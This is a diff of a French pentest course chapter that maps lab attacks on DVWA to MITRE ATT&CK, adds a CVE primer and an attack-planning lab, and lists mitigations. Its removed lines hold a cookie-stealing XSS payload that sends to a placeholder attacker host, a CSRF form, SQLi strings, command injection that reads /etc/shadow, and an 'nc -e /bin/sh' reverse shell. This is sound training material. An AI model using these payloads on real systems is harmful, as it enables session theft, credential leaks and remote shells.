@@ -184,22 +184,80 @@ Ce chapitre couvre la matrice ATT&CK (14 tactiques, 200+ techniques), le mapping
 
 **Fig 3** — Mapping des attaques classiques (Phishing, DDoS, SQLi, XSS, CSRF) vers leurs techniques et tactiques MITRE ATT&CK.
 
-### Correspondance CVE → ATT&CK
+---
 
-Les **CVE** (Common Vulnerabilities and Exposures) identifient une vulnérabilité spécifique dans un logiciel. Les **techniques ATT&CK** décrivent la méthode utilisée pour l'exploiter. Les deux sont complémentaires :
+## 2. CVE — Common Vulnerabilities and Exposures
+
+### Qu'est-ce qu'une CVE ?
+
+Une **CVE** (Common Vulnerabilities and Exposures) est un identifiant unique et standardisé qui référence une vulnérabilité de sécurité connue dans un logiciel ou un matériel. Créé par la **MITRE Corporation** en **1999**, le système CVE est aujourd'hui le référencement mondial des failles de cybersécurité.
+
+> En 1999, seules **541 CVE** avaient été publiées. En 2025, on dépasse les **240 000 CVE** — une croissance qui illustre l'explosion de la surface d'attaque numérique.
+
+### Format d'une CVE
+
+```
+CVE-YYYY-NNNNN
+```
+
+| Partie | Signification | Exemple |
+|--------|--------------|---------|
+| `CVE` | Préfixe fixe (Common Vulnerabilities and Exposures) | CVE |
+| `YYYY` | Année de découverte ou de publication | 2017 |
+| `NNNNN` | Numéro séquentiel (4+ chiffres, sans zéro devant) | 0144 |
+
+Exemples :
+- **CVE-2017-0144** → EternalBlue (buffer overflow SMB, utilisé par WannaCry)
+- **CVE-2011-2523** → vsftpd 2.3.4 (backdoor, vu au J2)
+- **CVE-2007-2447** → Samba 3.0.20 (usermap script, vu au J2)
+- **CVE-2021-44228** → Log4Shell (RCE dans Log4j, score CVSS 10.0)
+
+### Comment une CVE est-elle créée ?
+
+```mermaid
+flowchart LR
+    A["Chercheur<br/>découvre une faille"] --> B["Signale à l'éditeur<br/>(Microsoft, Apache, ...)"]
+    B --> C["Éditeur = CNA<br/>CVE Numbering Authority"]
+    C --> D["Assigne un ID<br/>CVE-YYYY-NNNNN"]
+    D --> E["Publication<br/>sur cve.org + NVD"]
+    E --> F["Correctif<br/>Patch + advisory"]
+```
+
+**Fig 4** — Cycle de vie d'une CVE : découverte → signalement → assignation → publication → correctif.
+
+Le réseau des **CNA** (CVE Numbering Authority) est organisé par MITRE :
+- **Root CNA** : MITRE elle-même (gère le programme)
+- **Éditeurs majeurs** : Microsoft, Oracle, Google, Apache, Red Hat, etc.
+- **Chercheurs indépendants** : peuvent passer par un CNA ou un éditeur pour obtenir un ID
+
+> Sans CVE, une vulnérabilité n'a pas d'identité officielle. Impossible de la tracer, de prioriser son correctif, ou de la référencer dans les outils de sécurité (Nessus, OpenVAS, Wazuh).
+
+### Bases de données CVE
+
+| Base | Opérateur | Particularité |
+|------|-----------|---------------|
+| [cve.org](https://www.cve.org/) | MITRE | Référence officielle |
+| [NVD](https://nvd.nist.gov/) | NIST | Ajoute le score **CVSS** + la sévérité |
+| [Exploit-DB](https://www.exploit-db.com/) | OffSec | Code d'exploitation fonctionnel |
+| [VulDB](https://vuldb.com/) | VulDB | Score propriétaire + trending |
+| [CVE Details](https://www.cvedetails.com/) | Independants | Statistiques par éditeur/produit |
+
+### Lien CVE → MITRE ATT&CK
+
+La **CVE** identifie *la vulnérabilité technique* (le trou). La **technique ATT&CK** décrit *la méthode pour l'exploiter* (la manœuvre). Les deux sont inséparables :
 
 | CVE | Vulnérabilité | Technique ATT&CK | Lab |
 |-----|---------------|------------------|-----|
 | CVE-2011-2523 | vsftpd 2.3.4 — backdoor (supply chain) | [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing App | J2 Lab 2.2 |
 | CVE-2007-2447 | Samba 3.0.20 — command injection (usermap) | [T1210](https://attack.mitre.org/techniques/T1210/) Exploit Remote Services | J2 Lab 2.3 |
-| CVE-2017-0144 | EternalBlue — buffer overflow SMB | [T1210](https://attack.mitre.org/techniques/T1210/) Exploit Remote Services | J1 Exercice 2 |
+| CVE-2017-0144 | EternalBlue — buffer overflow SMB | [T1210](https://attack.mitre.org/techniques/T1210/) Exploit Remote Services | J2 Lab 2.2 |
 | *(aucune)* | XSS, SQLi, CSRF, CMDi (vulnérabilités génériques) | [T1189](https://attack.mitre.org/techniques/T1189/), [T1190](https://attack.mitre.org/techniques/T1190/), [T1203](https://attack.mitre.org/techniques/T1203/), [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | J1 Labs 1.2-1.5 |
 
 > **Note :** Les failles web (XSS, SQLi) n'ont pas de CVE unique car elles dépendent de l'implémentation. En revanche, les vulnérabilités logicielles (vsftpd, Samba) ont une CVE bien spécifique qui permet de les tracer et de les corriger via un système de patch management (M1051).
 
 ---
 
-## 2. Profils d'attaquants
+## 3. Profils d'attaquants
 
 ```mermaid
 flowchart LR
@@ -210,169 +268,108 @@ flowchart LR
     A --> F["APT : Étatique — APT29, Lazarus"]
 ```
 
-**Fig 4** — Taxonomie des profils d'attaquants : White Hat, Black Hat, Grey Hat, Hacktiviste, APT.
+**Fig 5** — Taxonomie des profils d'attaquants : White Hat, Black Hat, Grey Hat, Hacktiviste, APT.
 
 ---
 
-## 3. Outils fondamentaux
+## Lab 1.0 — Conception : Plan d'attaque MITRE ATT&CK
 
-### nmap → [T1046](https://attack.mitre.org/techniques/T1046/) Network Service Scanning
+### Fiche
+
+| Durée | Conteneur | Dossier | Outils | ATT&CK |
+|---|---|---|---|---|
+| 30 min | Aucun (bac à sable) | `rendu_labs/jour-01/` | [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) | [TA0043](https://attack.mitre.org/tactics/TA0043/) → [TA0005](https://attack.mitre.org/tactics/TA0005/) |
+
+### Contexte métier
+
+Avant de lancer le moindre outil, un pentest professionnel commence par un **plan d'attaque**. Le client veut savoir : quelles techniques allez-vous utiliser ? dans quel ordre ? avec quel risque ? La matrice MITRE ATT&CK est le langage commun pour répondre à ces trois questions.
+
+Un bon plan = une feuille de route qui couvre la **reconnaissance**, l'**exploitation**, la **post-exploitation** et la **défense**. C'est ce cadre que vous allez construire dans ce lab.
+
+### Étape 1 — Cartographier les cibles
 
 ```bash
-# nmap -sV : détection de version des services (-sV = probe les bannières pour identifier version précise)
-nmap -sV <IP>              # Scan avec version
-# nmap -A : mode agressif = OS fingerprint (-O) + scripts (-sC) + versions (-sV) + traceroute
-nmap -A <IP>               # OS + scripts + versions
-# nmap --script vuln : exécute les scripts NSE de la catégorie vuln (détection CVE connues)
-nmap --script vuln <IP>    # Vulnérabilités connues
+mkdir -p rendu_labs/jour-01 && cd rendu_labs/jour-01
+# Lister les conteneurs cibles disponibles
+docker compose ps --services
 ```
 
-### Metasploit → [TA0001](https://attack.mitre.org/tactics/TA0001/)-TA0006
+Notez les services exposés par chaque conteneur (ports, protocoles). Vous utiliserez cette information pour choisir vos techniques d'attaque.
+
+### Étape 2 — Créer une couche ATT&CK complète
+
+Ouvrez [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) → **New Layer** → **Enterprise v15**.
+
+Créez une couche nommée `Plan JOUR-01` qui couvre les techniques suivantes, organisées par tactique :
+
+| Tactique | Technique | Outil prévu | Lab cible |
+|----------|-----------|-------------|-----------|
+| [TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance | [T1046](https://attack.mitre.org/techniques/T1046/) Network Service Scanning | nmap | 1.1 |
+| [TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance | [T1040](https://attack.mitre.org/techniques/T1040/) Network Sniffing | Wireshark / tcpdump | 1.2 |
+| [TA0001](https://attack.mitre.org/tactics/TA0001/) Initial Access | [T1189](https://attack.mitre.org/techniques/T1189/) Drive-by Compromise (XSS) | navigateur, curl | 1.2 |
+| [TA0001](https://attack.mitre.org/tactics/TA0001/) Initial Access | [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing Application (SQLi) | sqlmap | 1.3, 1.5 |
+| [TA0001](https://attack.mitre.org/tactics/TA0001/) Initial Access | [T1203](https://attack.mitre.org/techniques/T1203/) Exploitation for Client Execution (CSRF) | curl, HTML | 1.2 |
+| [TA0002](https://attack.mitre.org/tactics/TA0002/) Execution | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell (CMDi) | netcat, msfvenom | 1.4 |
+| [TA0006](https://attack.mitre.org/tactics/TA0006/) Credential Access | [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force | Hydra | 1.6 |
+| [TA0006](https://attack.mitre.org/tactics/TA0006/) Credential Access | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) Password Cracking | John the Ripper | 1.5 |
+
+**Consigne :** Ajoutez chaque technique dans le Navigator, coloriez en **rouge** les techniques que vous allez exécuter aujourd'hui, en **orange** celles qui dépendent d'une autre, et exportez en JSON → `rendu_labs/jour-01/plan-attaque-j1.json`.
+
+### Étape 3 — Ordonnancer l'attaque
+
+Pour chaque technique du plan, définissez :
+1. **Dépendance** : quelle technique doit réussir avant ?
+2. **Contre-mesure possible** : qu'est-ce qui pourrait nous bloquer ?
+3. **Objectif** : quel résultat attendu (shell, credentials, data) ?
+
+| Ordre | Technique | Dépend de | Risque | Objectif |
+|-------|-----------|-----------|--------|----------|
+| 1 | T1046 — Scan | — | Firewall bloque le port | Ports ouverts identifiés |
+| 2 | T1190 — SQLi | T1046 | WAF détecte union select | Dump de la base users |
+| 3 | T1189 — XSS | T1046 | CSP bloque le script | Vol de cookie admin |
+| 4 | T1059.004 — CMDi | T1046 | disable_functions coupe nc | Reverse shell |
+| 5 | T1110 — Brute Force | T1046 | Account lockout après 3 fails | Mot de passe admin |
+
+Documentez ce tableau dans `rendu_labs/jour-01/plan-attaque-j1.md`.
+
+### Étape 4 — Lancer l'infrastructure
 
 ```bash
-# Lancement de la console interactive Metasploit (framework d'exploitation modulaire)
-msfconsole
-# Recherche d'un exploit par mot-clé (ex: vsftpd, samba, eternalblue)
-search <exploit>
-# Sélection du module d'exploit à utiliser (chemin complet dans l'arborescence Metasploit)
-use <chemin>
-# Définit l'adresse IP de la cible distante (RHOSTS = Remote HoSTS)
-set RHOSTS <IP>
-# Lance l'exploit configuré contre la cible
-exploit
+# Démarrer tous les conteneurs du JOUR-01
+cd /chemin/vers/techniques-de-hacking-niveau-1
+source env.sh
+docker compose up -d --build dvwa sqli-app
 ```
 
-### Wireshark → [T1040](https://attack.mitre.org/techniques/T1040/) Network Sniffing
-
-Filtres : `http`, `tcp.port == 80`, `ip.addr == <IP>`
-
----
-
-## 4. Les 4 vulnérabilités web fondamentales
-
-### XSS → [T1189](https://attack.mitre.org/techniques/T1189/) Drive-by Compromise
-
-**Contexte métier :** 65% des applications web ont eu au moins une XSS. Un attaquant vole le cookie de session d'un administrateur → accès complet au back-office.
-
-**Fonctionnement :** L'application prend une entrée utilisateur (formulaire, URL) et l'affiche sans échapper les caractères HTML. Le navigateur interprète `<script>` comme du code exécutable.
-
-```mermaid
-flowchart LR
-    A["Victime"] -->|"1. Visite page infectée"| B["Serveur"]
-    B -->|"2. Page + script"| A
-    A -->|"3. Cookie volé"| C["Attaquant"]
-```
-
-**Fig 5** — Flux d'attaque XSS réfléchie : injection de script dans la page, exécution côté victime, exfiltration du cookie de session.
-
-```html
-<script>alert('XSS')</script>
-<script>new Image().src='http://<KALI_IP>:8000/?c='+document.cookie</script>
-```
-
-### CSRF → [T1203](https://attack.mitre.org/techniques/T1203/) Exploitation for Client Execution
-
-**Contexte métier :** L'attaquant force un utilisateur authentifié à exécuter une action (virement, changement de mot de passe) sans son consentement, simplement en visitant une page piégée.
-
-```html
-<form action="http://<CIBLE>/change_password.php" method="POST">
-  <input name="new_password" value="hacked">
-</form>
-<script>document.forms[0].submit();</script>
-```
-
-### SQL Injection → [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing Application
-
-**Contexte métier :** Première cause de breach de données selon l'OWASP. Un attaquant extrait la base clients complète, la revend sur le dark web. Coût moyen : 4.5M$.
-
-**Fonctionnement :** La requête SQL construite par concaténation de chaînes inclut l'entrée utilisateur. `SELECT * FROM users WHERE id='1' OR '1'='1'` retourne tout car `'1'='1'` est toujours vrai.
-
-```sql
-admin' OR '1'='1' --
-' UNION SELECT username, password FROM users --
-```
-
-```mermaid
-flowchart LR
-    A["Attaquant"] -->|"id=1' UNION SELECT user,pass FROM users--"| B["App PHP"]
-    B -->|"Requête SQL concaténée"| C["MySQL"]
-    C -->|"Résultat UNION : users + credentials"| B
-    B -->|"Affiche les credentials"| A
-```
-
-**Fig 5b** — Injection SQL de type UNION : l'attaquant concatène une seconde requête `SELECT` via `UNION` pour extraire la table `users` (identifiants) en plus des résultats normaux.
-
-### Command Injection → [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell
-
-**Contexte métier :** 30% des applications qui exécutent des commandes système sont vulnérables. Un `ping` mal sécurisé donne un shell complet sur le serveur.
-
-**Fonctionnement :** `system("ping " + $input)` exécute `ping 127.0.0.1; ls /etc/`. Le `;` termine la première commande et en lance une seconde.
+Vérifiez que les cibles répondent :
 
 ```bash
-# Commande séparateur ; exécute ls après le ping (le point-virgule termine la 1ère commande et en lance une 2ème)
-; ls /etc/passwd
-# Pipe | redirige la sortie du ping vers whoami (qui ignore l'entrée mais s'exécute quand même)
-| whoami
-# Opérateur && exécute cat seulement si le ping réussit (code retour 0)
-&& cat /etc/shadow
+curl -s -o /dev/null -w "%{http_code}" http://localhost:8088/login.php
+# → 200  (DVWA est prêt)
+curl -s -o /dev/null -w "%{http_code}" http://localhost:8083
+# → 200  (sqli-app est prêt)
 ```
 
-```mermaid
-flowchart LR
-    A["Attaquant"] -->|"; nc -e /bin/sh KALI 4444"| B["App vulnérable<br/>system(ping + input)"]
-    B -->|"shell reverse"| C["Kali écoute :4444"]
-    C -->|"Shell distant"| D["Commande post-exploitation<br/>id · whoami · ls /etc"]
-```
+### Checkpoints
 
-**Fig 5c** — Chaîne d'attaque Command Injection vers reverse shell : l'injection de `; nc -e /bin/sh <KALI> 4444` transforme un `ping` non sécurisé en shell distant exploitable.
+- [ ] Couche ATT&CK Navigator créée et exportée en JSON (5+ techniques)
+- [ ] Tableau d'ordonnancement rédigé (ordre, dépendance, risque, objectif)
+- [ ] Conteneurs dvwa et sqli-app démarrés, réponses HTTP 200
+- [ ] Plan déposé dans `rendu_labs/jour-01/`
 
----
+### 🔒 Contre-mesure (M1031 + M1041)
 
-## Tableau de référence : Outils et techniques des labs
+Un bon plan d'attaque sert aussi à la **défense** : chaque technique a sa mitigation.
 
-Ce tableau résume les **outils** et les **techniques d'attaque** utilisés dans les exercices pratiques de cette séance. Chaque lab est associé à sa tactique [MITRE ATT&CK](https://attack.mitre.org/) correspondante.
+| Technique | Mitigation |
+|-----------|------------|
+| T1046 — Scan | [M1031](https://attack.mitre.org/mitigations/M1031/) Network Intrusion Prevention (Snort/Suricata) |
+| T1190 — SQLi | [M1041](https://attack.mitre.org/mitigations/M1041/) WAF + Requêtes préparées |
+| T1189 — XSS | [M1013](https://attack.mitre.org/mitigations/M1013/) Application Hardening (CSP, htmlspecialchars) |
+| T1059.004 — CMDi | [M1018](https://attack.mitre.org/mitigations/M1018/) User Account Control + disable_functions |
+| T1110 — Brute Force | [M1036](https://attack.mitre.org/mitigations/M1036/) Account Lockout + MFA |
 
-| Lab | Outil principal | Vulnérabilité / Méthode | ATT&CK |
-|-----|----------------|-------------------------|--------|
-| 1.1 — Scan | nmap, gobuster, curl | Scan de ports, énumération web | [TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance — [T1046](https://attack.mitre.org/techniques/T1046/) |
-| 1.2 — XSS | navigateur, curl | Cross-Site Scripting (Reflected + Stored) | [T1189](https://attack.mitre.org/techniques/T1189/) Drive-by Compromise |
-| 1.3 — SQLi | sqlmap | SQL Injection automatisée | [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing Application |
-| 1.4 — CMDi | netcat, msfvenom, meterpreter | Command Injection → Reverse Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell |
-| 1.5 — Hash | sqlmap, john | SQLi avancée + craquage de hashs | [T1190](https://attack.mitre.org/techniques/T1190/) + [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force |
-| 1.6 — Hydra | hydra, dictionnaire | Brute-force de formulaire d'authentification | [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force |
-
----
-
-## Exercices
-
-### Exercice 1 : Couche ATT&CK Navigator
-
-**Énoncé :** Créez une couche avec [T1046](https://attack.mitre.org/techniques/T1046/), [T1189](https://attack.mitre.org/techniques/T1189/), [T1190](https://attack.mitre.org/techniques/T1190/), [T1059.004](https://attack.mitre.org/techniques/T1059/004/), [T1203](https://attack.mitre.org/techniques/T1203/). Exportez en JSON.
-
-<details><summary><strong>Solution</strong></summary>
-1. https://mitre-attack.github.io/attack-navigator/ → New Layer → Enterprise v15
-2. Ajouter les 5 techniques, colorer (rouge = testé)
-3. Download as JSON
-</details>
-
-### Exercice 2 : Mapping WannaCry
-
-**Énoncé :** WannaCry (2017) utilisait EternalBlue. Quelles techniques ATT&CK ?
-
-<details><summary><strong>Solution</strong></summary>
-- EternalBlue (CVE-2017-0144) → [T1210](https://attack.mitre.org/techniques/T1210/) ([TA0008](https://attack.mitre.org/tactics/TA0008/)), DoublePulsar → [T1543.003](https://attack.mitre.org/techniques/T1543/003/) ([TA0003](https://attack.mitre.org/tactics/TA0003/)), Chiffrement → [T1486](https://attack.mitre.org/techniques/T1486/) ([TA0014](https://attack.mitre.org/tactics/TA0014/))
-</details>
-
-### Exercice 3 : Mini-rapport DVWA
-
-**Énoncé :** Rédigez 4 fiches (une par vulnérabilité) avec type, ATT&CK, impact, remédiation.
-
-<details><summary><strong>Solution</strong></summary>
-1. XSS → [T1189](https://attack.mitre.org/techniques/T1189/) → htmlspecialchars() + CSP
-2. CSRF → [T1203](https://attack.mitre.org/techniques/T1203/) → Token anti-CSRF
-3. SQLi → [T1190](https://attack.mitre.org/techniques/T1190/) → Requêtes préparées PDO
-4. CMDi → [T1059.004](https://attack.mitre.org/techniques/T1059/004/) → escapeshellcmd()
-</details>
+Ajoutez ces mitigations dans une seconde couche ATT&CK Navigator (`defense-j1.json`) et associez chaque technique rouge à sa mitigation verte.
 
 ---
 
@@ -380,9 +377,9 @@ Ce tableau résume les **outils** et les **techniques d'attaque** utilisés dans
 
 ### Fiche
 
-| Durée | Conteneur | Dossier | Outils |
-|---|---|---|---|
-| 30 min | dvwa (port 8088) | `rendu_labs/jour-01/` | nmap, gobuster, curl |
+| Durée | Conteneur | Dossier | Outils | ATT&CK |
+|---|---|---|---|---|
+| 30 min | dvwa (port 8088) | `rendu_labs/jour-01/` | nmap, gobuster, curl | [TA0043](https://attack.mitre.org/tactics/TA0043/) Recon — [T1046](https://attack.mitre.org/techniques/T1046/) Network Scan |
 
 ### Contexte métier
 
@@ -1177,10 +1174,11 @@ docker exec dvwa-target bash -c "fail2ban-client status apache-dvwa"
 
 ## Synthèse du chapitre
 
-Ce chapitre vous a fait parcourir les **6 phases d'une attaque web complète**, de la reconnaissance à la défense :
+Ce chapitre vous a fait parcourir les **7 phases d'une attaque web complète**, de la conception du plan à la défense :
 
 | Lab | Attaque | Compétence acquise | ATT&CK |
 |-----|---------|-------------------|--------|
+| 1.0 | Conception | Plan d'attaque ATT&CK Navigator | [TA0043](https://attack.mitre.org/tactics/TA0043/) → [TA0005](https://attack.mitre.org/tactics/TA0005/) |
 | 1.1 | Scan + énumération | nmap, gobuster | [TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance |
 | 1.2 | XSS (Reflected + Stored) | Injection JavaScript, vol cookie | [T1189](https://attack.mitre.org/techniques/T1189/) |
 | 1.3 | SQLi automatique | sqlmap, dump base | [T1190](https://attack.mitre.org/techniques/T1190/) |
@@ -1210,6 +1208,7 @@ Ce chapitre vous a fait parcourir les **6 phases d'une attaque web complète**, 
 
 ## Points clés à retenir
 
+- **Planifier avant d'exécuter** : un plan ATT&CK complet guide chaque étape du pentest
 - **MITRE ATT&CK** : chaque attaque → ID Txxxx ([T1046](https://attack.mitre.org/techniques/T1046/), [T1189](https://attack.mitre.org/techniques/T1189/), [T1190](https://attack.mitre.org/techniques/T1190/), [T1059.004](https://attack.mitre.org/techniques/T1059/004/))
 - Les 14 tactiques couvrent le cycle complet d'une cyberattaque
 - **DVWA** expose les 4 familles de vulnérabilités web
